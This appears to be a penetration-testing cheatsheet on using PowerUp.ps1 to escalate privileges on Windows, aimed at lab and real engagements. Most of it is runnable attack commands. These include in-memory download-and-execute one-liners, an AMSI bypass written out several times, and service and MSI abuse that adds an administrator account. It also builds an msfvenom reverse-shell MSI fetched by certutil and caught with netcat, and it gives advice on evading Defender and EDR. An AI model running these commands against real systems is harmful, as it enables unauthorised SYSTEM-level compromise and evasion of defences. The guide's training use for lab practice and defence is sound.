title: PowerUp.ps1 — Windows Privilege Escalation Audit
body:
PowerUp is to Windows what linpeas is to Linux: an automated privilege escalation audit tool that runs every common privesc check in one shot. PowerUp is part of PowerSploit, written by HarmJ0y, and unlike most modern AV-flagged offensive tools it still loads cleanly in PowerShell on default Windows configs (with caveats — see the AMSI section below).

The pattern: load PowerUp into memory, run Invoke-AllChecks, read every finding, prioritize the easy wins. Most lab boxes fall to one specific PowerUp finding — AlwaysInstallElevated, weak service permissions, unquoted service path, or a writable %PATH% directory.

This node is the cheatsheet for what every Invoke-AllChecks finding means and how to abuse it.

— LOADING POWERUP — IN-MEMORY ONLY —

  Drop-to-disk PowerUp gets caught by Defender. Always load in-memory:

    powershell -ep bypass -c "IEX (IWR 'http://KALI/PowerUp.ps1' -UseBasicParsing); Invoke-AllChecks"

  This downloads PowerUp from your Kali HTTP server, evaluates it in
  memory, and immediately runs Invoke-AllChecks. No file ever touches disk.

  PowerUp is at:
    /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1
    /usr/share/powershell-empire/empire/server/data/module_source/privesc/PowerUp.ps1

  Serve it from your Kali working directory:
    cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
    python3 -m http.server 80

— THE INVOKE-ALLCHECKS OUTPUT — READING IT —

  Output is grouped by check type. Each finding looks like:

    ServiceName       : edgeupdate
    Path              : "C:\Program Files (x86)\Microsoft\...\update.exe"
    ModifiableFile    : C:\
    AbuseFunction     : Install-ServiceBinary -Name 'edgeupdate'
    CanRestart        : False

  The KEY field is AbuseFunction — it's the exact PowerUp command to
  exploit the finding. Copy that, run it from a fresh PowerUp load.

  CanRestart matters: if False, you need a system reboot or service
  restart trigger to fire your payload (after replacing the binary).
  If True, you can trigger it yourself.

— THE FULL CHECK CHEATSHEET (BY SEVERITY) —

  ★★★ INSTANT WIN — TRY FIRST ★★★

  Check: AlwaysInstallElevated Registry Key
    What it is: Both HKCU and HKLM AlwaysInstallElevated registry values
    are set to 1, allowing any user to install MSI packages as SYSTEM.
    AbuseFunction: Write-UserAddMSI
    Manual exploit: msfvenom MSI + msiexec
    Path forward: see always_install_elevated node

  Check: Modifiable Service Files / Modifiable Service Binary
    What it is: A service running as SYSTEM has its binary writable by
    your current user (or 'Authenticated Users' / 'Everyone').
    AbuseFunction: Install-ServiceBinary -Name '<service>'
    Manual exploit: replace the .exe with msfvenom payload, restart service
    See: weak_service node

  Check: Modifiable Services
    What it is: The service configuration itself is writable — you can
    change the binPath to point to your malicious executable.
    AbuseFunction: Set-ServiceBinaryPath -Name '<service>' -Path '<path>'
    Manual exploit: sc config <service> binPath= '<your.exe>' && sc start

  ★★ HIGH VALUE — STANDARD PRIVESC PATHS ★★

  Check: Unquoted Service Paths
    What it is: A service binary path with spaces and no quotes —
    e.g., C:\Program Files\App\service.exe — that you can drop a
    binary into the path interception point.
    AbuseFunction: Write-ServiceBinary -Name '<service>' -Path '<intercept>'
    Manual exploit: drop %INTERCEPT% (e.g., C:\Program.exe) and trigger
    See: unquoted_service node

  Check: %PATH% .dll Hijacks
    What it is: A directory in %PATH% is writable by your user, and
    SYSTEM-running services load DLLs from %PATH%.
    AbuseFunction: Write-HijackDll -DllPath '<path>\<dllname>.dll'
    Manual exploit: place malicious DLL with name a service expects
    See: win_dll_hijack node

  Check: Modifiable Registry Autoruns
    What it is: An autorun registry key (Run, RunOnce) points to a
    binary or path you can write to.
    AbuseFunction: Write-ServiceBinary or manual replacement
    Manual exploit: replace target binary, wait for next login

  ★ MEDIUM VALUE — REQUIRES TRIGGERS ★

  Check: Modifiable Scheduled Tasks
    What it is: A scheduled task's binary or script is writable.
    AbuseFunction: (manual)
    Manual exploit: replace the target script/binary, wait for trigger
    See: scheduled_tasks_win node

  Check: Vulnerable Schtasks
    What it is: Scheduled task running as SYSTEM with weak permissions
    on the task's actions.
    Manual exploit: schtasks /change to modify task action

  Check: Process Tokens
    What it is: SeDebug, SeImpersonate, SeAssignPrimaryToken on your
    user — leverage with token-impersonation tools.
    See: token_privs node

  ☆ LOW VALUE — INFORMATION ONLY ☆

  Check: Cached GPP files
    What it is: Old Group Policy Preferences XML files with cpassword
    attribute (decryptable to plaintext). Mostly only on domain-joined
    boxes or stale local SYSVOL.
    Manual exploit: gpp-decrypt <cpassword>

  Check: Unattended Install Files
    What it is: Unattend.xml, sysprep files with embedded credentials.
    Common paths: C:\Windows\Panther\Unattend.xml,
                  C:\sysprep\sysprep.xml
    Manual exploit: read the file, look for plaintext or base64 creds

  Check: HKLM\SAM Read
    What it is: SAM/SYSTEM hive readable as your user — but you usually
    need this AFTER privesc, not as a path TO privesc.

— AMSI AND ANTI-MALWARE BYPASS —

  Recent Windows Defender catches PowerUp.ps1 by string signature.
  Symptoms: download succeeds but Invoke-AllChecks errors out
  ('cannot run script that has been blocked by AV').

  Bypass options (in order of complexity):

    1. AMSI bypass first, then load PowerUp:
       powershell -ep bypass
       [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
       IEX(IWR 'http://KALI/PowerUp.ps1' -UseBasicParsing)
       Invoke-AllChecks

    2. Use a modified PowerUp with rotated function names
       (search for 'PowerUp obfuscated' on GitHub)

    3. Manual checks instead — see the cmd block for individual
       PowerShell one-liners that replace specific PowerUp checks.

— RELATED TOOLS —

  WINPEAS: more thorough than PowerUp, but Defender catches the binary
  hard. Use PowerUp first as the cheap initial scan, fall back to winpeas
  for deeper coverage. See: winpeas node.

  SHARPUP: C# port of PowerUp. Compile to a .NET binary, transfer, run.
  Useful when PowerShell is blocked but binary execution isn't.
  Repo: github.com/GhostPack/SharpUp

  SEATBELT: more reconnaissance-focused than privesc — disclosed
  configurations, security products, etc. Complement to PowerUp.
  Repo: github.com/GhostPack/Seatbelt
cmd:
# ── STEP 1: SERVE POWERUP FROM KALI ──────────────────
mkdir -p ~/exploits/powerup && cd ~/exploits/powerup
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
ls -la PowerUp.ps1

# Serve over HTTP
python3 -m http.server 80
# Or with sudo if you need port 80:
sudo python3 -m http.server 80

# ── STEP 2: LOAD POWERUP IN-MEMORY ON TARGET ─────────
# In your low-priv shell on the target:

# Method A: One-liner (recommended)
powershell -ep bypass -c "IEX (IWR 'http://KALI_IP/PowerUp.ps1' -UseBasicParsing); Invoke-AllChecks"

# Method B: Two-step (sometimes more reliable)
powershell -ep bypass
# Then in PS:
IEX (New-Object Net.WebClient).DownloadString('http://KALI_IP/PowerUp.ps1')
Invoke-AllChecks

# Method C: From cmd shell (when PowerShell isn't already running)
powershell "iex (iwr 'http://KALI_IP/PowerUp.ps1' -UseBasicParsing); Invoke-AllChecks"

# ── STEP 3: SAVE THE OUTPUT ──────────────────────────
# Capture to a file for later reference
powershell -ep bypass -c "IEX (IWR 'http://KALI_IP/PowerUp.ps1' -UseBasicParsing); Invoke-AllChecks | Out-File C:\\Users\\Public\\powerup.txt"
type C:\Users\Public\powerup.txt

# ── STEP 4: TRIAGE FINDINGS BY SEVERITY ──────────────
# Read in this priority order:

# 1. AlwaysInstallElevated Registry Key
#    → AbuseFunction: Write-UserAddMSI (or manual MSI — see always_install_elevated)

# 2. Modifiable Service Files / Modifiable Services
#    → AbuseFunction: Install-ServiceBinary -Name '<service>'
#    → CanRestart: True is best, False means you wait for service restart

# 3. Unquoted Service Paths
#    → AbuseFunction: Write-ServiceBinary -Name '<svc>' -Path '<intercept>'

# 4. %PATH% .dll Hijacks
#    → AbuseFunction: Write-HijackDll -DllPath '<path>\<dll>.dll'

# 5. Modifiable Scheduled Tasks / Registry Autoruns
#    → Replace target binary, wait for trigger

# ── STEP 5: ABUSE THE FINDING ─────────────────────────

# AlwaysInstallElevated abuse (PowerUp's built-in):
IEX (IWR 'http://KALI_IP/PowerUp.ps1' -UseBasicParsing)
Write-UserAddMSI
# Creates a UserAdd.msi in current dir that adds your user to Administrators
# Then: msiexec /quiet /qn /i UserAdd.msi

# Modifiable service abuse:
IEX (IWR 'http://KALI_IP/PowerUp.ps1' -UseBasicParsing)
$cred = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Install-ServiceBinary -Name '<servicename>' -UserName 'evil' -Password $cred
# This creates 'evil' user with admin rights via service manipulation

# Or for shell instead of user:
Install-ServiceBinary -Name '<servicename>' \
  -Command 'powershell -nop -c "IEX (IWR http://KALI/rev.ps1 -UseBasicParsing)"'

# Unquoted service path abuse:
Write-ServiceBinary -Name '<servicename>' -Path 'C:\Program.exe'

# DLL hijack abuse:
Write-HijackDll -DllPath 'C:\Users\<user>\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

# ── STEP 6: TRIGGER AND CATCH ─────────────────────────
# After abuse, you usually need to:
#  - Restart the service (if CanRestart was True)
#  - Wait for service auto-restart (if CanRestart was False)
#  - Trigger the autorun (logout/login)
#  - Wait for scheduled task trigger time

# Restart service manually if you have rights:
sc stop <service>
sc start <service>

# Or via PowerShell:
Restart-Service -Name '<service>' -Force

# Set up listener BEFORE triggering:
rlwrap -cAr nc -nlvp 443

# ── AMSI BYPASS (WHEN POWERUP IS BLOCKED) ─────────────
# Defender frequently blocks PowerUp.ps1. Try the AMSI bypass first:

powershell -ep bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
IEX (IWR 'http://KALI_IP/PowerUp.ps1' -UseBasicParsing)
Invoke-AllChecks

# Or one-liner:
powershell -ep bypass -c "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); IEX (IWR 'http://KALI_IP/PowerUp.ps1' -UseBasicParsing); Invoke-AllChecks"

# If AMSI bypass doesn't work either, see amsi_bypass node for advanced techniques.

# ── MANUAL CHECKS WHEN POWERUP IS BLOCKED ────────────
# When neither PowerUp nor AMSI bypass works, do the most important
# checks manually:

# AlwaysInstallElevated:
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Both must = 0x1

# Service permissions (manual):
Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -notlike '"*"*' -and $_.PathName -like '* *' } | Select Name, PathName, StartMode
# Lists unquoted service paths

Get-Acl HKLM:\SYSTEM\CurrentControlSet\Services\* | Where-Object { $_.AccessToString -match 'Everyone|Users|Authenticated' }
# Services with weak ACLs

# Writable directories in %PATH%:
$env:PATH -split ';' | ForEach-Object { $p=$_; try { (Get-Acl $p).Access | Where-Object { $_.IdentityReference -match 'Everyone|Users|Authenticated' -and $_.FileSystemRights -match 'Write' } | ForEach-Object { Write-Host "WRITABLE: $p" } } catch {} }

# Scheduled tasks:
Get-ScheduledTask | Where-Object { $_.State -eq 'Ready' } | Select TaskName, TaskPath

# ── BONUS: SHARPUP (BINARY VERSION) ──────────────────
# When PowerShell is heavily restricted but you can run .NET binaries:

# Compile from source:
git clone https://github.com/GhostPack/SharpUp
# Open in Visual Studio, build Release

# Or use precompiled (less recommended — may be flagged):
wget https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpUp.exe

# Run on target:
SharpUp.exe audit
# Same checks as PowerUp's Invoke-AllChecks, but no PowerShell required

# ── BONUS: THE POWERUP-TO-SHELL ONE-LINER ────────────
# Once you've identified AlwaysInstallElevated as the path, this is the
# fastest route from PowerUp finding to SYSTEM shell:

# On Kali:
msfvenom -p windows/shell_reverse_tcp LHOST=KALI_IP LPORT=443 -f msi -o evil.msi
python3 -m http.server 80
rlwrap -cAr nc -nlvp 443

# On target:
certutil -urlcache -f http://KALI_IP/evil.msi C:\Windows\Temp\evil.msi
msiexec /quiet /qn /i C:\Windows\Temp\evil.msi
# SYSTEM shell hits your listener within seconds
warn:
POWERUP IS A 2014-ERA TOOL — DEFENDER CATCHES IT BY DEFAULT:
  Modern Windows Defender flags PowerUp.ps1 by string signature on most
  Windows 10 / Server 2019+ installs. Lab boxes (PG, HTB, OSCP) typically
  have Defender disabled or not deployed, so it works fine. Real
  engagements: assume blocked, plan for AMSI bypass or use SharpUp.

ALWAYS RUN INVOKE-ALLCHECKS — NOT INDIVIDUAL CHECKS:
  Some PowerUp guides suggest running specific checks (Get-ServiceUnquoted,
  Get-RegistryAlwaysInstallElevated, etc.). Don't bother — Invoke-AllChecks
  runs every check and the runtime difference is negligible. The full
  output is the cheatsheet — read all findings, prioritize abuse.

ABUSEFUNCTION FIELD IS COPY-PASTE READY:
  Each finding's AbuseFunction line is a complete PowerShell command.
  Copy it verbatim (with the parameters PowerUp included) and paste into
  a fresh PowerUp-loaded session. PowerUp's authors did the work for you.

CANRESTART: FALSE IS NOT A DEAD END:
  If a service has CanRestart: False (your user can't restart it),
  you can still abuse it — wait for the service to restart on its own:
    - System reboot (most reliable on lab boxes)
    - Service crash (some services auto-restart)
    - Scheduled maintenance (real engagements)
  Or trigger via another path — many services have triggers like network
  events, file system changes, or scheduled tasks that restart them.

TOKEN PRIVILEGES VS POWERUP FINDINGS:
  whoami /priv shows what privileges your token holds (SeImpersonate,
  SeDebug, SeBackup, etc.). PowerUp doesn't focus on these — it focuses
  on misconfigurations. Always run BOTH:
    whoami /priv      # token-based privesc paths
    PowerUp           # configuration-based privesc paths
  Different findings, different exploitation paths. See token_privs node.

CHECKS RUNTIME — INVOKE-ALLCHECKS TAKES 30-60 SECONDS:
  On a busy box with many services, PowerUp may take a while. Don't kill
  it early — the SUID-equivalent finding (AlwaysInstallElevated) usually
  appears at the end of output, not the beginning.

MODIFIABLE SERVICE FINDINGS — VERIFY BEFORE EXPLOITING:
  PowerUp sometimes flags 'Modifiable Service Files' on services where
  the actual binary path is read-only but a parent directory is writable.
  This may or may not be exploitable depending on whether the service
  resolves the binary at start time. Verify with:
    icacls 'C:\Program Files\App\service.exe'
    icacls 'C:\Program Files\App\'
  Look for write rights on YOUR user or a group YOUR user is in.

DON'T INSTALL POWERUP TO DISK ON REAL ENGAGEMENTS:
  In-memory loading (IEX IWR) leaves no file artifacts. Dropping
  PowerUp.ps1 to disk creates a permanent IoC — file SHA matches a known
  PowerSploit binary, instant detection by EDR file scanners.
  In labs: doesn't matter. In real engagements: never drop to disk.

ABUSE FUNCTION OUTPUTS THE NEXT COMMAND — READ IT:
  Some abuse functions don't directly compromise the target — they output
  a follow-up command you need to run separately. E.g., Write-UserAddMSI
  creates UserAdd.msi but you still need to run msiexec on it. Read the
  function's output carefully.

FAILED OBFUSCATED-POWERUP DOES NOT MEAN AMSI:
  Sometimes PowerUp loads but Invoke-AllChecks errors out partway through
  with cryptic .NET exceptions. This is usually NOT AMSI — it's PowerUp
  hitting a check that fails on this Windows version (older PowerUp on
  newer Windows, or vice versa). Try a different PowerUp version, or run
  individual checks instead of Invoke-AllChecks.

choices.label: Found credentials in output — try elsewhere
